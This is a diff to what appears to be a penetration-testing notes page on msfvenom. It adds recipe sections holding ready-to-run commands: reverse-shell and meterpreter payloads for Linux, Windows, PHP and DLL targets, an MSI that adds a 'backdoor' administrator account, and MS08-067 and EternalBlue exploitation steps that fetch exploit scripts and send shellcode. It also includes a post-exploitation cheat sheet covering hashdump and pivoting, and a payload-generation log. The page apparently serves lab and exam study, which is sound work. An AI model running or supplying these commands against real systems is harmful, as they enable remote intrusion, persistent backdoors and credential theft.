@@ -11,6 +11,8 @@ hideFooterPagination: true
 
 Replace UPPER_CASE values with your lab values.
 
+[Search this tool’s saved examples](/commands/notebook?tool=msfvenom) · [All tools](/index)
+
 ## Commands
 
 **Kali**
@@ -24,8 +26,171 @@ These are raw stageless shells: listen on Kali with sudo nc -lvnp 443. Meterpret
 
 [Find another command](/index) · [Ports](/enumeration/ports-cheatsheet)
 
-[More saved commands for this tool](https://dashboard-aed21664.mintlify.site/find-anything?q=msfvenom)
+## Notebook recipes
 
-## Learning and original examples
+9 additional examples, grouped by task. Saved as written; prompts, output, original lab values and older syntax may be included.
 
-- [Shells, Payloads, and Interactive TTYs](/exploitation/shells-payloads-cheat-sheet)
+<AccordionGroup>
+
+<Accordion title="Payloads — staged vs stageless">
+
+### Payloads — staged vs stageless
+
+**Getting Started with Penetration Testing**
+
+```bash
+msfvenom -p linux/x64/shell_reverse_tcp LHOST=<IP> LPORT=4444 -f elf -o shell.elf
+```
+
+</Accordion>
+
+<Accordion title="Mental model">
+
+### Mental model
+
+**Metasploit Framework: Startup to Sessions**
+
+```text
+Have a vuln + MSF module?  → search → use → set RHOSTS/LHOST/PAYLOAD → run
+No module, but can run a file? → msfvenom payload → multi/handler to catch it
+Got a session?  → sessions -i, background, sessions -u (upgrade to meterpreter)
+In meterpreter? → migrate, getsystem, hashdump, local_exploit_suggester
+Need the internal net? → autoroute + socks_proxy → proxychains everything else
+Always: LHOST = your tun0, payload in venom must match the handler
+```
+
+</Accordion>
+
+<Accordion title="msfvenom — generate standalone payloads">
+
+### msfvenom — generate standalone payloads
+
+**Metasploit Framework: Startup to Sessions**
+
+```bash
+# Linux ELF reverse shell
+msfvenom -p linux/x64/shell_reverse_tcp LHOST=tun0 LPORT=4444 -f elf -o shell.elf
+
+# Windows EXE meterpreter
+msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=tun0 LPORT=4444 -f exe -o shell.exe
+
+# PHP web shell
+msfvenom -p php/meterpreter_reverse_tcp LHOST=tun0 LPORT=4444 -f raw -o shell.php
+
+# List formats / payloads
+msfvenom --list formats
+msfvenom --list payloads | grep windows
+```
+
+</Accordion>
+
+<Accordion title="Common MSFvenom Commands">
+
+### Common MSFvenom Commands
+
+**Shells, Payloads, and Interactive TTYs**
+
+```bash
+# Linux reverse shell (stageless, ELF binary)
+msfvenom -p linux/x64/shell_reverse_tcp LHOST=<IP> LPORT=443 -f elf > shell.elf
+
+# Windows reverse shell (stageless, EXE)
+msfvenom -p windows/shell_reverse_tcp LHOST=<IP> LPORT=443 -f exe > shell.exe
+
+# Windows Meterpreter (staged)
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=<IP> LPORT=443 -f exe > meterp.exe
+
+# List all payloads
+msfvenom -l payloads
+
+# List formats
+msfvenom --list formats
+```
+
+</Accordion>
+
+<Accordion title="AlwaysInstallElevated">
+
+### AlwaysInstallElevated
+
+**Windows Privilege Escalation: Full Checklist**
+
+```powershell
+msfvenom -p windows/adduser USER=backdoor PASS=backdoor123 -f msi -o evil.msi
+msfvenom -p windows/adduser USER=backdoor PASS=backdoor123 -f msi-nouac -o evil.msi
+msiexec /quiet /qn /i C:\evil.msi
+```
+
+</Accordion>
+
+<Accordion title="MS08-067 (NetAPI)">
+
+### MS08-067 (NetAPI)
+
+**Windows Privilege Escalation: Full Checklist**
+
+```powershell
+https://raw.githubusercontent.com/jivoi/pentest/master/exploit_win/ms08-067.py
+msfvenom -p windows/shell_reverse_tcp LHOST=10.10.10.10 LPORT=443 EXITFUNC=thread -b "\x00\x0a\x0d\x5c\x5f\x2f\x2e\x40" -f py -v shellcode -a x86 --platform windows
+
+Example: MS08_067_2018.py 192.168.1.1 1 445 -- for Windows XP SP0/SP1 Universal, port 445
+Example: MS08_067_2018.py 192.168.1.1 2 139 -- for Windows 2000 Universal, port 139 (445 could also be used)
+Example: MS08_067_2018.py 192.168.1.1 3 445 -- for Windows 2003 SP0 Universal
+Example: MS08_067_2018.py 192.168.1.1 4 445 -- for Windows 2003 SP1 English
+Example: MS08_067_2018.py 192.168.1.1 5 445 -- for Windows XP SP3 French (NX)
+Example: MS08_067_2018.py 192.168.1.1 6 445 -- for Windows XP SP3 English (NX)
+Example: MS08_067_2018.py 192.168.1.1 7 445 -- for Windows XP SP3 English (AlwaysOn NX)
+python ms08-067.py 10.0.0.1 6 445
+```
+
+</Accordion>
+
+<Accordion title="MS17-010 (Eternal Blue)">
+
+### MS17-010 (Eternal Blue)
+
+**Windows Privilege Escalation: Full Checklist**
+
+```powershell
+git clone https://github.com/helviojunior/MS17-010
+
+# generate a simple reverse shell to use
+msfvenom -p windows/shell_reverse_tcp LHOST=10.10.10.10 LPORT=443 EXITFUNC=thread -f exe -a x86 --platform windows -o revshell.exe
+python2 send_and_execute.py 10.0.0.1 revshell.exe
+```
+
+</Accordion>
+
+<Accordion title="🧾 QUICK REFERENCE — &quot;I see X → do Y&quot;">
+
+### 🧾 QUICK REFERENCE — "I see X → do Y"
+
+**Windows Post-Exploitation: Field Reference**
+
+Context from the notebook: AlwaysInstallElevated = 1 (both) msfvenom -f msi  →  msiexec /quiet /i evil.msi
+
+```text
+msfvenom -f msi
+```
+
+</Accordion>
+
+<Accordion title="Generating a DLL Payload">
+
+### Generating a DLL Payload
+
+**Historical AD Vulnerability Labs · older reference**
+
+```shellsession
+grcic550@htb[/htb]$ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=172.16.5.225 LPORT=8080 -f dll > backupscript.dll
+
+[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
+[-] No arch selected, selecting arch: x64 from the payload
+No encoder specified, outputting raw payload
+Payload size: 510 bytes
+Final size of dll file: 8704 bytes
+```
+
+</Accordion>
+
+</AccordionGroup>
